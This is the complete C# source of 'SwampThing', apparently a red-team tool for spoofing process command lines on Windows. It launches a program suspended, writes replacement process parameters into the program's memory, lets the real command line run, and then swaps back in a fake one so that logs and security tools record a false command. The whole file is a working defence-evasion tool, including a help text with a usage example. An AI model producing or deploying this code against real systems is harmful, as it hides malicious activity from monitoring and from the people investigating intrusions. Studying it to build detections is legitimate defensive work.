using System;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using System.IO;
using CommandLine;

namespace SwampThing
{
    class Program
    {
        // Flags
        [Flags]
        public enum CreateProcessFlags : uint
        {
            NONE = 0x00000000,
            DEBUG_PROCESS = 0x00000001,
            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
            CREATE_SUSPENDED = 0x00000004,
            DETACHED_PROCESS = 0x00000008,
            CREATE_NEW_CONSOLE = 0x00000010,
            NORMAL_PRIORITY_CLASS = 0x00000020,
            IDLE_PRIORITY_CLASS = 0x00000040,
            HIGH_PRIORITY_CLASS = 0x00000080,
            REALTIME_PRIORITY_CLASS = 0x00000100,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            CREATE_SEPARATE_WOW_VDM = 0x00000800,
            CREATE_SHARED_WOW_VDM = 0x00001000,
            CREATE_FORCEDOS = 0x00002000,
            BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
            ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
            INHERIT_PARENT_AFFINITY = 0x00010000,
            INHERIT_CALLER_PRIORITY = 0x00020000,
            CREATE_PROTECTED_PROCESS = 0x00040000,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
            PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
            PROCESS_MODE_BACKGROUND_END = 0x00200000,
            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
            CREATE_NO_WINDOW = 0x08000000,
            PROFILE_USER = 0x10000000,
            PROFILE_KERNEL = 0x20000000,
            PROFILE_SERVER = 0x40000000,
            CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000,
        }

        [Flags]
        public enum AllocationProtect : uint
        {
            NONE = 0x00000000,
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400
        }

        // Structs
        [StructLayout(LayoutKind.Sequential)]
        public class RUNTIME_CHECK
        {
            public bool SwampIs32;
            public bool OSIs32;
            public bool PePathIsValid;
            public Int16 PeArch;
        }

        [StructLayout(LayoutKind.Sequential)]
        public class StartupInfo
        {
            public Int32 cb = 0;
            public IntPtr lpReserved = IntPtr.Zero;
            public IntPtr lpDesktop = IntPtr.Zero;
            public IntPtr lpTitle = IntPtr.Zero;
            public Int32 dwX = 0;
            public Int32 dwY = 0;
            public Int32 dwXSize = 0;
            public Int32 dwYSize = 0;
            public Int32 dwXCountChars = 0;
            public Int32 dwYCountChars = 0;
            public Int32 dwFillAttribute = 0;
            public Int32 dwFlags = 0;
            public Int16 wShowWindow = 0;
            public Int16 cbReserved2 = 0;
            public IntPtr lpReserved2 = IntPtr.Zero;
            public IntPtr hStdInput = IntPtr.Zero;
            public IntPtr hStdOutput = IntPtr.Zero;
            public IntPtr hStdError = IntPtr.Zero;

            public StartupInfo()
            {
                this.cb = Marshal.SizeOf(this);
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct ProcessInformation
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public Int32 dwProcessId;
            public Int32 dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus;
            public IntPtr PebBaseAddress;
            public IntPtr AffinityMask;
            public IntPtr BasePriority;
            public UIntPtr UniqueProcessId;
            public IntPtr InheritedFromUniqueProcessId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public class SecurityAttributes
        {
            public Int32 Length = 0;
            public IntPtr lpSecurityDescriptor = IntPtr.Zero;
            public bool bInheritHandle = false;

            public SecurityAttributes()
            {
                this.Length = Marshal.SizeOf(this);
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING
        {
            public UInt16 Length;
            public UInt16 MaximumLength;
            public IntPtr Buffer;
        }

        // Kernel32
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        public static extern bool CreateProcess (
            String lpApplicationName,
            String lpCommandLine,
            SecurityAttributes lpProcessAttributes,
            SecurityAttributes lpThreadAttributes,
            Boolean bInheritHandles,
            CreateProcessFlags dwCreationFlags,
            IntPtr lpEnvironment,
            String lpCurrentDirectory,
            [In] StartupInfo lpStartupInfo,
            out ProcessInformation lpProcessInformation);

        [DllImport("kernel32.dll")]
        public static extern Boolean WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            IntPtr lpBuffer,
            UInt32 nSize,
            ref UInt32 lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern Boolean ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            IntPtr lpBuffer,
            UInt32 dwSize,
            ref UInt32 lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        public static extern void RtlZeroMemory(
            IntPtr pBuffer,
            int length);

        [DllImport("kernel32.dll")]
            public static extern Boolean VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            UInt32 dwSize,
            AllocationProtect flNewProtect,
            ref UInt32 lpflOldProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            int flAllocationType,
            int flProtect);

        [DllImport("kernel32.dll")]
        public static extern UInt32 ResumeThread(
            IntPtr hThread);

        // NtDll
        [DllImport("ntdll.dll")]
        public static extern UInt32 NtQueryInformationProcess(
            IntPtr processHandle,
            UInt32 processInformationClass,
            ref PROCESS_BASIC_INFORMATION processInformation,
            int processInformationLength,
            ref UInt32 returnLength);

        [DllImport("ntdll.dll")]
        public static extern void RtlInitUnicodeString(
            ref UNICODE_STRING DestinationString,
            [MarshalAs(UnmanagedType.LPWStr)]
            string SourceString);

        [DllImport("ntdll.dll")]
        public static extern UInt32 RtlCreateProcessParametersEx(
            ref IntPtr pProcessParameters,
            IntPtr ImagePathName,
            IntPtr DllPath,
            IntPtr CurrentDirectory,
            IntPtr CommandLine,
            IntPtr Environment,
            IntPtr WindowTitle,
            IntPtr DesktopInfo,
            IntPtr ShellInfo,
            IntPtr RuntimeData,
            uint Flags);

        public static void PrintLogo()
        {
            Console.WriteLine("      /                                      ");
            Console.WriteLine("     :;                \\                    ");
            Console.WriteLine("     |l      _____     |;                    ");
            Console.WriteLine("     `8o __-~     ~\\   d|     Swamp         ");
            Console.WriteLine("      \"88p;.  -._\\_;.oP         Thing      ");
            Console.WriteLine("       `>,% (\\  (\\./)8\"                   ");
            Console.WriteLine("      ,;%%%:  ./V^^^V'                       ");
            Console.WriteLine(";;;,-::::::'_::\\   ||\\                     ");
            Console.WriteLine("8888oooooo.  :\\`^^^/,,~--._                 ");
            Console.WriteLine(" oo.8888888888:`((( o.ooo888                 ");
            Console.WriteLine("   `o`88888888b` )) 888b8888                 ");
            Console.WriteLine("     b`888888888;(.,\"888b888\\              ");
            Console.WriteLine("....  b`8888888:::::.`8888.                  ");
            Console.WriteLine(" `:::. `:::OOO:::::::.`OO' ;                 ");
            Console.WriteLine("   `.      \"``::::::''.'        ~ b33f ~  \n");
        }

        public static void PrintHelp()
        {
            string HelpText = " >--~~--> Args? <--~~--<\n\n" +
                              "-Launch (-l)       Full path to the target PE.\n" +
                              "-RealCmdLine (-r)  The command line the process will execute.\n" +
                              "-FakeCmdLine (-f)  The command line the process loggs as executed.\n\n" +
                              " >--~~--> Usage? <--~~--<\n\n" +
                              "SwampThing.exe -l C:\\Windows\\System32\\notepad.exe -f C:\\aaa.txt -r C:\\bbb.txt";
            Console.WriteLine(HelpText);
        }

        // Helpers
        public static RUNTIME_CHECK CheckAllTheThings(String Launch)
        {
            RUNTIME_CHECK rt = new RUNTIME_CHECK();
            if (IntPtr.Size == 4)
            {
                rt.SwampIs32 = true;
            } else
            {
                rt.SwampIs32 = false;
            }

            if (!String.IsNullOrEmpty(Environment.GetEnvironmentVariable("ProgramFiles(x86)")))
            {
                rt.OSIs32 = false;
            } else
            {
                rt.OSIs32 = true;
            }

            bool bExists = File.Exists(Launch);
            rt.PePathIsValid = bExists;

            Int16 Arch = GetPeArch(Launch);
            rt.PeArch = Arch;

            return rt;
        }
        
        public static PROCESS_BASIC_INFORMATION PBI(IntPtr hProc)
        {
            PROCESS_BASIC_INFORMATION PBI = new PROCESS_BASIC_INFORMATION();
            int PBI_Size = Marshal.SizeOf(PBI);
            UInt32 RetLen = 0;
            UInt32 CallResult = NtQueryInformationProcess(hProc,0,ref PBI,PBI_Size,ref RetLen);
            return PBI;
        }

        public static Int16 GetPeArch(String PE)
        {
            Int16 PeArch;
            Byte[] PeArray;
            IntPtr pArray = IntPtr.Zero;
            bool bExists = File.Exists(PE);
            if (!bExists)
            {
                PeArch = 0;
            } else
            {
                try
                {
                    FileStream fs = new FileStream(PE, FileMode.Open, FileAccess.Read);
                    PeArray = new byte[0x500];
                    fs.Read(PeArray, 0, 0x500);
                } catch
                {
                    PeArch = 0;
                    return PeArch;
                }

                pArray = Marshal.AllocHGlobal(PeArray.Length);
                Marshal.Copy(PeArray, 0, pArray, PeArray.Length);

                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(pArray.ToInt64() + 0x3c));
                PeArch = Marshal.ReadInt16((IntPtr)(pArray.ToInt64() + PeHeader + 0x18));
                if (PeArch != 0x010b && PeArch != 0x020b)
                {
                    PeArch = 0;
                }
            }

            // Free array
            if (pArray != IntPtr.Zero)
            {
                Marshal.FreeHGlobal(pArray);
            }

            return PeArch;
        }

        public static IntPtr EmitUnicodeString(String Data)
        {
            UNICODE_STRING StringObject = new UNICODE_STRING();
            StringObject.Length = (UInt16)(Data.Length * 2);
            StringObject.MaximumLength = (UInt16)(StringObject.Length + 1);
            StringObject.Buffer = Marshal.StringToHGlobalUni(Data);
            IntPtr pUnicodeString = Marshal.AllocHGlobal(16);
            Marshal.StructureToPtr(StringObject, pUnicodeString, true);
            return pUnicodeString;
        }

        public static IntPtr ReadRemoteMem(IntPtr hProc, Int64 pMem, Int32 Size)
        {
            // Alloc & null buffer
            IntPtr pMemLoc = Marshal.AllocHGlobal(Size);
            RtlZeroMemory(pMemLoc, Size);

            // Read
            uint BytesRead = 0;
            bool bRPM = ReadProcessMemory(hProc, (IntPtr)(pMem), pMemLoc, (uint)Size, ref BytesRead);
            if (!bRPM || BytesRead != Size)
            {
                if (pMemLoc != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(pMemLoc);
                }
                return IntPtr.Zero;
            } else
            {
                return pMemLoc;
            }
        }

        public static IntPtr AllocRemoteMem(IntPtr hProc, Int32 Size, IntPtr Address = new IntPtr())
        {
            IntPtr pRemoteMem = VirtualAllocEx(hProc, Address, (UInt32)Size, 0x3000, (Int32)AllocationProtect.PAGE_READWRITE);
            return pRemoteMem;
        }

        public static Boolean WriteRemoteMem(IntPtr hProc, IntPtr pSource, IntPtr pDest, Int32 Size, AllocationProtect Protect)
        {
            UInt32 BytesWritten = 0;
            Boolean bRemoteWrite = WriteProcessMemory(hProc, pDest, pSource, (uint)Size, ref BytesWritten);
            if(!bRemoteWrite)
            {
                return false;
            }

            UInt32 OldProtect = 0;
            Boolean bProtect = VirtualProtectEx(hProc, pDest, (uint)Size, Protect, ref OldProtect);
            if (!bProtect)
            {
                return false;
            }

            return true;
        }

        // Main logic
        public static void SpawnTheThing(String Launch, String RealCmdLine, String FakeCmdLine = "")
        {
            // Invoke all the checks
            RUNTIME_CHECK RunTime = CheckAllTheThings(Launch);
            if (RunTime.PePathIsValid == false)
            {
                Console.WriteLine("[!] Invalid PE path specified..");
                return;
            }
            if (RunTime.PeArch == 0)
            {
                Console.WriteLine("[!] Invalid PE image..");
                return;
            }
            if (RunTime.SwampIs32 && RunTime.PeArch == 0x020b || !RunTime.SwampIs32 && RunTime.PeArch == 0x010b)
            {
                Console.WriteLine("[!] SwampThing and target PE architectures do not match..");
                return;
            }

            // Create the target process
            SecurityAttributes SecAttrib = new SecurityAttributes();
            String CurrentDir = Directory.GetCurrentDirectory();
            StartupInfo si = new StartupInfo();
            ProcessInformation pi;
            bool bProc = CreateProcess(Launch, FakeCmdLine, SecAttrib, SecAttrib, false, CreateProcessFlags.CREATE_SUSPENDED, IntPtr.Zero, CurrentDir, si, out pi);
            if (!bProc)
            {
                Console.WriteLine("[!] Process execution failed..");
                return;
            } else
            {
                Console.WriteLine("[>] CreateProcess -> Suspended");
            }

            // Get PBI
            PROCESS_BASIC_INFORMATION CallResult = PBI(pi.hProcess);
            if (CallResult.PebBaseAddress == IntPtr.Zero)
            {
                Console.WriteLine("[!] Failed to aquire PBI");
                return;
            } else
            {
                if (RunTime.PeArch == 0x010b)
                {
                    Console.WriteLine("[+] PE Arch                       : 32-bit");
                } else
                {
                    Console.WriteLine("[+] PE Arch                       : 64-bit");
                }
                Console.WriteLine("[+] Process Id                    : " + CallResult.UniqueProcessId);
                Console.WriteLine("[+] PEB Base                      : 0x" + string.Format("{0:X}", (CallResult.PebBaseAddress).ToInt64()));
            }

            // Get PEB->(IntPtr)_RTL_USER_PROCESS_PARAMETERS->(UNICODE_STRING)CommandLine
            Int32 RTL_USER_PROCESS_PARAMETERS;
            Int32 CommandLine;
            Int32 ReadSize;
            if (RunTime.PeArch == 0x010b)
            {
                RTL_USER_PROCESS_PARAMETERS = 0x10;
                CommandLine = 0x40;
                ReadSize = 0x4;
            } else
            {
                RTL_USER_PROCESS_PARAMETERS = 0x20;
                CommandLine = 0x70;
                ReadSize = 0x8;
            }

            // We can't acquire a remote PEB lock so we sleep briefly
            System.Threading.Thread.Sleep(500); // 500ms

            // Read remote PEB offsets
            UInt64 ProcParams;
            IntPtr pProcParams = ReadRemoteMem(pi.hProcess, ((CallResult.PebBaseAddress).ToInt64() + RTL_USER_PROCESS_PARAMETERS), ReadSize);
            if (ReadSize == 0x4)
            {
                ProcParams = (UInt64)Marshal.ReadInt32(pProcParams);
            } else
            {
                ProcParams = (UInt64)Marshal.ReadInt64(pProcParams);
            }
            Console.WriteLine("[+] RTL_USER_PROCESS_PARAMETERS   : 0x" + string.Format("{0:X}", ProcParams));
            UInt64 CmdLineUnicodeStruct = ProcParams + (UInt64)CommandLine;
            Console.WriteLine("[+] CommandLine                   : 0x" + string.Format("{0:X}", CmdLineUnicodeStruct));

            // Get current CommandLine -> UNICODE_STRING
            UNICODE_STRING CurrentCmdLineStruct = new UNICODE_STRING();
            Int32 UniStructSize = Marshal.SizeOf(CurrentCmdLineStruct);
            IntPtr pCmdLineStruct = ReadRemoteMem(pi.hProcess, (Int64)CmdLineUnicodeStruct, UniStructSize);
            CurrentCmdLineStruct = (UNICODE_STRING)Marshal.PtrToStructure(pCmdLineStruct, typeof(UNICODE_STRING));
            Console.WriteLine("[+] UNICODE_STRING |-> Len        : " + CurrentCmdLineStruct.Length);
            Console.WriteLine("                   |-> MaxLen     : " + CurrentCmdLineStruct.MaximumLength);
            Console.WriteLine("                   |-> pBuff      : 0x" + string.Format("{0:X}", (UInt64)CurrentCmdLineStruct.Buffer));

            // Create replacement CommandLine
            Console.WriteLine("\n[>] Rewrite -> RTL_USER_PROCESS_PARAMETERS");

            // RTL_USER_PROCESS_PARAMETERS unicode string params
            String WinDir = Environment.GetEnvironmentVariable("windir");
            IntPtr uSystemDir = EmitUnicodeString((WinDir + "\\System32"));
            IntPtr uLaunchPath = EmitUnicodeString(Launch);
            IntPtr uWindowName = EmitUnicodeString("SwampThing");
            IntPtr uRealCmdLine = EmitUnicodeString(" " + RealCmdLine);

            // Create local RTL_USER_PROCESS_PARAMETERS
            IntPtr pProcessParams = IntPtr.Zero;
            uint RtlCreateSuccess = RtlCreateProcessParametersEx(ref pProcessParams, uLaunchPath, uSystemDir, uSystemDir, uRealCmdLine, IntPtr.Zero, uWindowName, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 1);
            if (RtlCreateSuccess != 0)
            {
                Console.WriteLine("[!] Failed to create process parameters");
                return;
            } else
            {
                Console.WriteLine("[+] RtlCreateProcessParametersEx  : 0x" + string.Format("{0:X}", (UInt64)pProcessParams));
            }

            // Remote map RTL_USER_PROCESS_PARAMETERS
            Int32 iProcessParamsSize = Marshal.ReadInt32((IntPtr)((Int64)pProcessParams + 4));
            IntPtr pRemoteProcessParams = AllocRemoteMem(pi.hProcess, iProcessParamsSize, pProcessParams);
            Boolean bRemoteWriteSuccess = WriteRemoteMem(pi.hProcess, pProcessParams, pProcessParams, iProcessParamsSize, AllocationProtect.PAGE_READWRITE);
            if (bRemoteWriteSuccess)
            {
                Console.WriteLine("[+] RemoteAlloc                   : 0x" + string.Format("{0:X}", (UInt64)pRemoteProcessParams));
                Console.WriteLine("[+] Size                          : " + iProcessParamsSize);
            } else
            {
                Console.WriteLine("[!] Failed to allocate custom RTL_USER_PROCESS_PARAMETERS");
                return;
            }

            // Rewrite the process parameters pointer
            IntPtr pRewriteProcessParams = Marshal.AllocHGlobal(ReadSize);
            if (ReadSize == 0x4)
            {
                Marshal.WriteInt32(pRewriteProcessParams, (Int32)pProcessParams);
            } else
            {
                Marshal.WriteInt64(pRewriteProcessParams, (Int64)pProcessParams);
            }
            bRemoteWriteSuccess = WriteRemoteMem(pi.hProcess, pRewriteProcessParams, (IntPtr)((CallResult.PebBaseAddress).ToInt64() + RTL_USER_PROCESS_PARAMETERS), ReadSize, AllocationProtect.PAGE_READWRITE);
            if (bRemoteWriteSuccess)
            {
                Console.WriteLine("[?] Success, sleeping 500ms..");
            }
            else
            {
                Console.WriteLine("[!] Failed to rewrite PEB->pProcessParameters");
                return;
            }

            // Resume process
            UInt32 ResumeProc = ResumeThread(pi.hThread);
            System.Threading.Thread.Sleep(500);

            // Finally we rewrite the commandline to the fake value
            Console.WriteLine("\n[>] Reverting RTL_USER_PROCESS_PARAMETERS");
            IntPtr uFakeCmdLine = EmitUnicodeString(" " + FakeCmdLine);
            Console.WriteLine("[+] Local UNICODE_STRING          : 0x" + string.Format("{0:X}", (UInt64)uFakeCmdLine));

            // Copy unicode buffer to remote process
            IntPtr pRemoteCmdLine = AllocRemoteMem(pi.hProcess, (Marshal.ReadInt16((IntPtr)((UInt64)uFakeCmdLine + 2)))); // MaxLength
            if (ReadSize == 0x4)
            {
                bRemoteWriteSuccess = WriteRemoteMem(pi.hProcess, (IntPtr)(Marshal.ReadInt32((IntPtr)((UInt64)uFakeCmdLine + 4))), pRemoteCmdLine, (Marshal.ReadInt16(uFakeCmdLine)), AllocationProtect.PAGE_READWRITE);
            } else
            {
                bRemoteWriteSuccess = WriteRemoteMem(pi.hProcess, (IntPtr)(Marshal.ReadInt64((IntPtr)((UInt64)uFakeCmdLine + 8))), pRemoteCmdLine, (Marshal.ReadInt16(uFakeCmdLine)), AllocationProtect.PAGE_READWRITE);
            }
            Console.WriteLine("[+] Remote UNICODE_STRING.Buffer  : 0x" + string.Format("{0:X}", (UInt64)pRemoteCmdLine));

            // Recalculate new RTL_USER_PROCESS_PARAMETERS
            pProcParams = ReadRemoteMem(pi.hProcess, ((CallResult.PebBaseAddress).ToInt64() + RTL_USER_PROCESS_PARAMETERS), ReadSize);
            if (ReadSize == 0x4)
            {
                ProcParams = (UInt64)Marshal.ReadInt32(pProcParams);
            }
            else
            {
                ProcParams = (UInt64)Marshal.ReadInt64(pProcParams);
            }
            Console.WriteLine("[+] pRTL_USER_PROCESS_PARAMETERS  : 0x" + string.Format("{0:X}", ProcParams));

            // Rewrite RTL_USER_PROCESS_PARAMETERS->CommandLine => Length, MaxLength, Buffer
            bRemoteWriteSuccess = WriteRemoteMem(pi.hProcess, uFakeCmdLine, (IntPtr)(ProcParams + (UInt32)CommandLine), 2, AllocationProtect.PAGE_READWRITE);
            bRemoteWriteSuccess = WriteRemoteMem(pi.hProcess, (IntPtr)((UInt64)uFakeCmdLine + 2), (IntPtr)(ProcParams + (UInt32)CommandLine + 2), 2, AllocationProtect.PAGE_READWRITE);
            IntPtr pRemoteBuff = Marshal.AllocHGlobal(8);
            if (ReadSize == 0x4)
            {
                Marshal.WriteInt32(pRemoteBuff, (Int32)pRemoteCmdLine);
                bRemoteWriteSuccess = WriteRemoteMem(pi.hProcess, pRemoteBuff, (IntPtr)(ProcParams + (UInt32)CommandLine + 4), 4, AllocationProtect.PAGE_READWRITE);
            }
            else
            {
                Marshal.WriteInt64(pRemoteBuff, (Int64)pRemoteCmdLine);
                bRemoteWriteSuccess = WriteRemoteMem(pi.hProcess, pRemoteBuff, (IntPtr)(ProcParams + (UInt32)CommandLine + 8), 8, AllocationProtect.PAGE_READWRITE);
            }
            Console.WriteLine("[?] Success rewrote Len, MaxLen, Buffer..");
        }

        class ArgOptions
        {
            [Option("l", "Launch")]
            public string Launch { get; set; }

            [Option("r", "RealCmdLine")]
            public string RealCmdLine { get; set; }

            [Option("f", "FakeCmdLine")]
            public string FakeCmdLine { get; set; }
        }

        static void Main(string[] args)
        {
            // Read args
            var ArgOptions = new ArgOptions();

            // Because ASCII ¯\_(ツ)_/¯
            PrintLogo();

            // Parse args
            if (CommandLineParser.Default.ParseArguments(args, ArgOptions))
            {
                if (!string.IsNullOrEmpty(ArgOptions.Launch) || !string.IsNullOrEmpty(ArgOptions.RealCmdLine) || !string.IsNullOrEmpty(ArgOptions.FakeCmdLine))
                {
                    SpawnTheThing(ArgOptions.Launch, ArgOptions.RealCmdLine, ArgOptions.FakeCmdLine);
                }
                else
                {
                    PrintHelp();
                }
            }
            else
            {
                PrintHelp();
            }
        }
    }
}
